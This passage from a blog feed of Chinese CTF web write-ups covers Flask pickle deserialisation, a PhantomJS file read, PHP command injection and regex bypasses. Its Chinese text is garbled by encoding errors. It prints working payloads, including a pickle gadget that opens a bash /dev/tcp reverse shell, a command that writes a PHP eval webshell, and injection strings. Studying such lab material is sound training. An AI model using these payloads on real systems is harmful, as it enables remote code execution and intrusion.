/flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}</code></pre><p><img src="/2021/08/03/cscctf-2019-flasklight/image-20210804222527142.png" alt="image-20210804222527142"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FireshellCTF:2020-ScreenShooter</title>
      <link href="2021/08/02/fireshellctf-2020-screenshooter/"/>
      <url>2021/08/02/fireshellctf-2020-screenshooter/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/08/02/fireshellctf-2020-screenshooter/image-20210803213632789.png" alt="image-20210803213632789"></p><p>åªæœ‰ä¸€ä¸ªåŠŸèƒ½ç‚¹ï¼Œå¯¹è¾“å…¥çš„URLè¿›è¡Œè®¿é—®ï¼Œç„¶åŽè¿”å›žæˆªå›¾ã€‚</p><p>æ¯”å¦‚è¾“å…¥ç™¾åº¦çš„URLå°±ä¼šè¿”å›žå®ƒçš„æˆªå›¾</p><p>æ—¢ç„¶æ˜¯è®¿é—®äº†è¿™ä¸ªURLï¼Œé‚£å°±ç”Ÿæˆä¸ªURLè®©å®ƒè®¿é—®ï¼Œçœ‹ä¸€ä¸‹è¿”å›žçš„ä¿¡æ¯</p><p>åœ¨ <a href="https://beeceptor.com/">https://beeceptor.com/</a> ä¸Šç”Ÿæˆä¸€ä¸ªä¸´æ—¶åŸŸåï¼Œè®©è¿™ä¸ªé¢˜ç›®è®¿é—®ï¼Œå¯ä»¥çœ‹åˆ°è®¿é—®çš„è¯·æ±‚å¤´</p><p><img src="/2021/08/02/fireshellctf-2020-screenshooter/image-20210803213703993.png" alt="image-20210803213703993"></p><p>åœ¨æ ‡é¢˜ä¸­æˆ‘ä»¬å¯ä»¥æ¸…æ¥šçœ‹åˆ°ä½¿ç”¨PhantomJS</p><blockquote><p>Phantom JSæ˜¯ä¸€ä¸ªæœåŠ¡å™¨ç«¯çš„ JavaScript API çš„ WebKitã€‚å…¶æ”¯æŒå„ç§Webæ ‡å‡†ï¼š DOM å¤„ç†, CSS é€‰æ‹©å™¨, JSON, Canvas, å’Œ SVGè¯´ç™½äº†å°±æ˜¯ä¸€ä¸ªçˆ¬è™«ï¼Œç”¨æ¥çˆ¬å–ç½‘é¡µ</p></blockquote><p>è¯´ç™½äº†å°±æ˜¯ä¸€ä¸ªçˆ¬è™«ï¼Œç”¨æ¥çˆ¬å–ç½‘é¡µ</p><p>æœç´¢PhatomJSå‘çŽ°å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´žCVE-2019-17221</p><p><img src="/2021/08/02/fireshellctf-2020-screenshooter/image-20210803213751146.png" alt="image-20210803213751146"></p><p>è¯¥æ¼æ´žé€šè¿‡file://URLçš„XMLHttpRequestè§¦å‘</p><p>exp:</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;&lt;/head&gt;&lt;body&gt;&lt;link rel="attachment" href="file:///flag"&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>è®©é¢˜ç›®è®¿é—® http://æœåŠ¡å™¨åœ°å€/index.html å³å¯</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HFCTF:2021-easyflask</title>
      <link href="2021/08/01/hfctf-2021-easyflask/"/>
      <url>2021/08/01/hfctf-2021-easyflask/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/08/01/hfctf-2021-easyflask/image-20210802215741280.png" alt="image-20210802215741280"></p><p>/app/sourceé‡Œçš„æºç </p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3.6</span><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> sessionapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"SECRET_KEY"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"*******"</span>User <span class="token operator">=</span> type<span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>object<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'uname'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span>    <span class="token string">'is_admin'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">'__repr__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> o<span class="token punctuation">.</span>uname<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span> <span class="token operator">=</span> u    <span class="token keyword">return</span> <span class="token string">"/file?file=index.js"</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/file'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">file_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">or</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span> \            <span class="token operator">or</span> <span class="token string">'.py'</span> <span class="token keyword">in</span> path <span class="token operator">or</span> <span class="token string">'.sh'</span> <span class="token keyword">in</span> path <span class="token operator">or</span> <span class="token string">'..'</span> <span class="token keyword">in</span> path <span class="token operator">or</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'disallowed'</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>        content <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> content@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        u <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>u<span class="token punctuation">,</span> dict<span class="token punctuation">)</span><span class="token punctuation">:</span>            u <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>u<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>u<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'uhh?'</span>    <span class="token keyword">if</span> u<span class="token punctuation">.</span>is_admin <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'welcome, admin'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'who are you?'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>/proc/self/environ</p><pre><code>HOSTNAME=99d252572f0cPYTHON_VERSION=3.8.2PWD=/app_=/usr/local/bin/python3HOME=/rootLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568FLAG=flag_not_hereSHLVL=1PYTHON_PIP_VERSION=20.0.2PYTHON_GET_PIP_SHA256=421ac1d44c0cf9730a088e337867d974b91bdce4ea2636099275071878cc189ePYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d59197a3c169cef378a22428a3fa99d33e080a5d/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binsecret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuhOLDPWD=/app</code></pre><p>å¯ä»¥çœ‹åˆ°secret_keyå€¼ä¸º<code>glzjin22948575858jfjfjufirijidjitg3uiiuuh</code>ã€‚çŸ¥é“secret_keyä¹‹åŽå°±å¯ä»¥æ±¡æŸ“sessionï¼Œç„¶åŽpickleååºåˆ—åŒ–RCEã€‚è¿™é‡Œçš„ååºåˆ—åŒ–å’Œæ™®é€šçš„ååºåˆ—åŒ–ä¸€æ ·ï¼Œå¹¶æ²¡æœ‰åœ¨opcodeä¸Šè¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥è§£å†³åŠžæ³•ä¹Ÿå°±æ˜¯ä½¿ç”¨<code>__reduce__</code>è¿›è¡ŒRCEã€‚</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token keyword">import</span> osUser <span class="token operator">=</span> type<span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>object<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'uname'</span><span class="token punctuation">:</span> <span class="token string">'tyskill'</span><span class="token punctuation">,</span>    <span class="token string">'is_admin'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">'__repr__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> o<span class="token punctuation">.</span>uname<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true"># æ·»åŠ __reduce__æ–¹æ³•RCE</span>    <span class="token string">'__reduce__'</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> o<span class="token punctuation">:</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/IP/PORT 0>&amp;1'"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>u <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>ç”Ÿæˆä¹‹åŽä½¿ç”¨<strong>flask_session_cookie_manager</strong>æŒ‰ç…§æ ¼å¼<code>{'u':{'b':'base64å­—ç¬¦ä¸²'}}</code>ç”Ÿæˆsessionæ›¿æ¢åŽŸsessionè®¿é—®<code>/admin</code>å°±å¯ä»¥åå¼¹shellã€‚</p><p>sessionã€‚.eJwtxksOgjAUAMCrmJ4AJJBAwqIQS_gZtUpLdzwSH5ha2Agi4e66cFazkhcJVrIDEhCkvKqQ_sVlnGR2I95WI9yPTueDkqqDjF9_96TtjyCjqTWXu1zQgFOanLszOJGGHo0SxwGWCOs9s9LYf0LCTJpQPPV0Ug_WqaUdC5PpWpyHXHGmWX4rMAzJtn0BiBswYw.YI07Bg.NkAe66dAOnYTZHn9l0D-Wsetbtså¤åˆ¶åˆ°é¢˜ç›®ä¸­ï¼Œè®¿é—®/adminï¼ŒæŠ¥500é”™è¯¯ï¼Œåˆæ­¥åˆ¤æ–­æˆåŠŸäº†ã€‚ç„¶åŽè®¿é—®<code>/file?file=/f1ag</code>å¾—åˆ°flag</p><p>æ³¨ï¼š</p><p>é¶æœºæ˜¯LinuxçŽ¯å¢ƒï¼Œæœ¬åœ°æ˜¯WindowsçŽ¯å¢ƒï¼Œè¿™ä¸¤ä¸ªçŽ¯å¢ƒä¸‹dumpsçš„ç»“æžœä¸­åºåˆ—åŒ–å­—ç¬¦ä¸²å£°æ˜Žç³»ç»Ÿçš„æ ‡è¯†ç¬¦ä¸åŒï¼šLinux=&gt;posixï¼›Windows=&gt;ntï¼Œéœ€è¦å°†è„šæœ¬æ”¾åœ¨LinuxçŽ¯å¢ƒä¸‹ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¾ŠåŸŽæ¯:2020-Blackcat</title>
      <link href="2021/07/29/yang-cheng-bei-2020-blackcat/"/>
      <url>2021/07/29/yang-cheng-bei-2020-blackcat/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/07/29/yang-cheng-bei-2020-blackcat/image-20210730005043654.png" alt="image-20210730005043654"></p><p><img src="/2021/07/29/yang-cheng-bei-2020-blackcat/image-20210730020359672.png" alt="image-20210730020359672"></p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Black-Cat-Sheriff'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'è°ï¼ç«Ÿæ•¢è¸©æˆ‘ä¸€åªè€³çš„å°¾å·´ï¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$clandestine</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"clandestine"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'White-cat-monitor'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token variable">$clandestine</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'White-cat-monitor'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$clandestine</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hh</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$clandestine</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$hh</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Black-Cat-Sheriff'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'æœ‰æ„çž„å‡†ï¼Œæ— æ„å‡»å‘ï¼Œä½ çš„æ¢¦æƒ³å°±æ˜¯ä½ è¦çž„å‡†çš„ç›®æ ‡ã€‚ç›¸ä¿¡è‡ªå·±ï¼Œä½ å°±æ˜¯é‚£é¢—å°„ä¸­é¶å¿ƒçš„å­å¼¹ã€‚'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"nc"</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h5 id="hash-hmac-â€”-ä½¿ç”¨-HMAC-æ–¹æ³•ç”Ÿæˆå¸¦æœ‰å¯†é’¥çš„å“ˆå¸Œå€¼"><a href="#hash-hmac-â€”-ä½¿ç”¨-HMAC-æ–¹æ³•ç”Ÿæˆå¸¦æœ‰å¯†é’¥çš„å“ˆå¸Œå€¼" class="headerlink" title="hash_hmac â€” ä½¿ç”¨ HMAC æ–¹æ³•ç”Ÿæˆå¸¦æœ‰å¯†é’¥çš„å“ˆå¸Œå€¼"></a>hash_hmac â€” ä½¿ç”¨ HMAC æ–¹æ³•ç”Ÿæˆå¸¦æœ‰å¯†é’¥çš„å“ˆå¸Œå€¼</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> <span class="token string">';env'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><pre><code>Black-Cat-Sheriff=afd556602cf62addfe4132a81b2d62b9db1b6719f83e16cce13f51960f56791b&amp;One-ear=%3Benv&amp;White-cat-monitor[]=1a</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¾ŠåŸŽæ¯:2020-Easyphp2</title>
      <link href="2021/07/28/yang-cheng-bei-2020-easyphp2/"/>
      <url>2021/07/28/yang-cheng-bei-2020-easyphp2/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/07/28/yang-cheng-bei-2020-easyphp2/image-20210728193440265.png" alt="image-20210728193440265"></p><p><img src="/2021/07/28/yang-cheng-bei-2020-easyphp2/image-20210728225539347.png" alt="image-20210728225539347"></p><p>è®¿é—®robots.txt</p><p><img src="/2021/07/28/yang-cheng-bei-2020-easyphp2/image-20210728225848765.png" alt="image-20210728225848765"></p><p>æœ‰ä¸ªLFIï¼Œurlä¸¤æ¬¡ç¼–ç ç»•è¿‡</p><pre><code>http://86e11d7e-91c7-42ce-bae1-4c2b80609516.node4.buuoj.cn?file=php://filter/convert.%25%36%32ase64-encode/resource=GWHT.php</code></pre><p>è§£ç å¾—</p><pre class=" language-php"><code class="language-php">    <span class="token delimiter">&lt;?php</span>    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'max_execution_time'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">'PASS'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'pass'</span><span class="token punctuation">,</span> <span class="token string">'PASS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'&lt;h2>'</span><span class="token punctuation">.</span><span class="token string">'&lt;hacker>'</span><span class="token punctuation">.</span><span class="token string">'&lt;h2>'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">.</span><span class="token string">'&lt;h1>'</span><span class="token punctuation">.</span><span class="token string">'404'</span><span class="token punctuation">.</span><span class="token string">'&lt;h1>'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">.</span><span class="token string">'Sorry, only people from GWHT are allowed to access this website.'</span><span class="token punctuation">.</span><span class="token string">'23333'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token delimiter">?></span>    <span class="token delimiter">&lt;?php</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"count"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"count"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/;|base64|rot13|base32|base16|&lt;\?php|#/i'</span><span class="token punctuation">,</span> <span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;h2>The Count is: "</span> <span class="token punctuation">.</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'printf \''</span> <span class="token punctuation">.</span> <span class="token variable">$count</span> <span class="token punctuation">.</span> <span class="token string">'\' | wc -c'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/h2>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token delimiter">?></span></code></pre><p>åŒç†,check.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token string">"GWHT"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Cookie password.</span><span class="token keyword">echo</span> <span class="token string">"Here is nothing, isn't it ?"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre><code>/?file=GWHT.php&amp;count='|echo+"&lt;%3f%3d+eval(\$_POST['shell'])%3f&gt;"+&gt;+a.php' </code></pre><p>burpä¿®æ”¹passwordä¸ºGWHT</p><p><img src="/2021/07/28/yang-cheng-bei-2020-easyphp2/image-20210728231048152.png" alt="image-20210728231048152"></p><p>èšå‰‘è¿žæŽ¥</p><p>/GWHT/system/of/a/down/flag.txt</p><p><img src="/2021/07/28/yang-cheng-bei-2020-easyphp2/image-20210728231450387.png" alt="image-20210728231450387"></p><p>æƒé™é—®é¢˜è¯»ä¸äº†</p><p>READMEé‡Œé¢æœ‰ä¸ªhash</p><p><img src="/2021/07/28/yang-cheng-bei-2020-easyphp2/image-20210728231515551.png" alt="image-20210728231515551"></p><p>è§£å¯†åŽä¸ºGWHTCTF</p><p>printf â€œGWHTCTFâ€ | su - GWHT -c â€˜cat /GWHT/system/of/a/down/flag.txtâ€™</p><p><img src="/2021/07/28/yang-cheng-bei-2020-easyphp2/image-20210728231538925.png" alt="image-20210728231538925"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>FBCTF:2019-RCEService</title>
      <link href="2021/07/28/fbctf-2019-rceservice/"/>
      <url>2021/07/28/fbctf-2019-rceservice/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/07/28/fbctf-2019-rceservice/image-20210728182037204.png" alt="image-20210728182037204"></p><pre><code>{"cmd":"ls"}</code></pre><p><img src="/2021/07/28/fbctf-2019-rceservice/image-20210728182059096.png" alt="image-20210728182059096"></p><p>æºç </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">'PATH=/home/rceservice/jail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span><span class="token punctuation">,</span> <span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'Attempting to run command:&lt;br/>'</span><span class="token punctuation">;</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span> <span class="token operator">!==</span> <span class="token keyword">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">'Invalid input'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>preg_match()å‡½æ•°åªèƒ½åŒ¹é…ç¬¬ä¸€è¡Œæ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨æ¢è¡Œç¬¦%0aç»•è¿‡</p><pre><code>{%0A"cmd":"/bin/cat /home/rceservice/flag"%0A}</code></pre><p>æˆ–è€…</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestspayload <span class="token operator">=</span> <span class="token string">'{"cmd":"/bin/cat /home/rceservice/flag","test":"'</span> <span class="token operator">+</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'"}'</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://ad66432f-4628-41f6-8190-d9b9c247904c.node3.buuoj.cn/"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"cmd"</span><span class="token punctuation">:</span>payload<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" 